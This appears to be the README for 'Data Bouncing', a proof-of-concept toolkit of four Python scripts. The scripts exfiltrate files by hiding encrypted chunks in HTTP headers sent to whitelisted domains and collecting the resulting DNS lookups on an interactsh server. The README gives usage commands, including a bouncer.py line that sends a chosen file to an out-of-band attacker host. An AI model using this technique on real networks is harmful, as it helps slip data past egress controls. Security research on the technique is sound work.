Data Bouncing
=============
These four scripts are used to bounce data between two endpoints, making use of DNS lookups against the content of some HTTP header types.
Reconnaissance of useable channels can be carried out using the Recruiter (finds suitable candidates) and Dentist (extracts suitable targets from Recruiter output) scripts.
Exploitation of selected channels can be carried out by exfiltrating files using Bouncer (throws out the files) and Therapist (puts the received bits back together).


recruiter.py	V0.1	Partially working, but fixes coming soon. You may get better results using Head_Hunterv2.sh.
dentist.py	V1.0	Currently working and tested.
bouncer.py	V0.2	Working PoC for binary file transfer/exfiltration (see below). Further functionality to come.
thetherapist.py	V0.2	Working PoC for reassembly of exfiltrated file (see below). Further functionality to come.


Background
----------
This is a PoC based on John and Dave's ideas outlined in https://thecontractor.io/DataBouncing
Read the URL for further information on how the technique works.

Upcoming Changes and Improvements
---------------------------------
Further functionality will be added bouncer and thetherapist, to allow bidirectional communication. At some point there will be a single integrated application to do everything.


Usage
=====
Note - you will need a DNS server under your own control to use the scripts.

For hobbyist/learning uses, InteractSh is recommended. Use the client available on GitHub:
https://github.com/projectdiscovery/interactsh
This server can be used to collect the data:
https://app.interactsh.com/#/

The following cmd line params were used for interactsh client in order to get appropriate output data for the PoC:
./interactsh-client -s cmz5ed12vtc0000r7r5ggkx1zgoyyyyyb.oast.fun -sf your_session.file -asn -o test_data.json -json -v

Note that the server named in the -s parameter will be the server name provided on the web page of the interactsh server. The example given above will not work for you and should be replaced by the value copied from your server.

Recruiter
---------
You provide a file containing potential targets to be assessed, and Recruiter will assess the viability of using them for data bouncing. The targets will be external domains that are whitelisted by the environment that you are planning to DataBounce from. After running Recruiter, he JSON output from interactsh ca be passed to Dentist to extract usable hostnames.

Dentist
-------
Extract a list of usable hosts from JSON data. It requires the content of the "unique-id" param found in your JSON output from running Recruiter against your list of hosts, and will extract the usable host from the "full-id" param, clipping the unwanted string from the end:
"unique-id":"ckji0gb5hom1mdsb8p7gmphu9ibe1sxoq","full-id":"www.host.example.org.ji0gb5hom1mdsb8p7gmphu9ibe1sxoq","
Usage:
python3 dentist.py input.json string_to_remove

eg:
python3 dentist.py input.json ckji0gb5hom1mdsb8p7gmphu9ibe1sxoq

Bouncer
-------
Provide an exfil domain (a DNS server under your control), and a file that you wish to exfiltrate. The Bouncer will randomly choose a domain name to query, encrypt the file and send it in chunks to be prepended as part of the payload within the header, to be subsequently collected by the DNS server under your control.
You'll need to specify a unique ID that will be used to reassemble the file after smuggling.
Example cmd line input:
python3 bouncer.py -e cmz5ed12vtc0000r7r5ggkx1zgoyyyyyb.oast.fun -f your_filename.jpeg -u 5555 -v

Note that the exile server named by the -e parameter above should match the server name copied from the interactsh web interface, as used as named on the cmd line for interactsh client. It should *not* match the full hostname in the interactsh client terminal output.

Therapist
---------
When provided with JSON input from the DNS server, therapist extracts and reassembles the individual encrypted chunks, decrypts them and writes the output to a filename of your choosing.
Use the unique ID that you used during exfiltration.
Example cmd line input:
python3 thetherapist.py -i your_output.json -o output_filename.jpeg -u 5555 -v

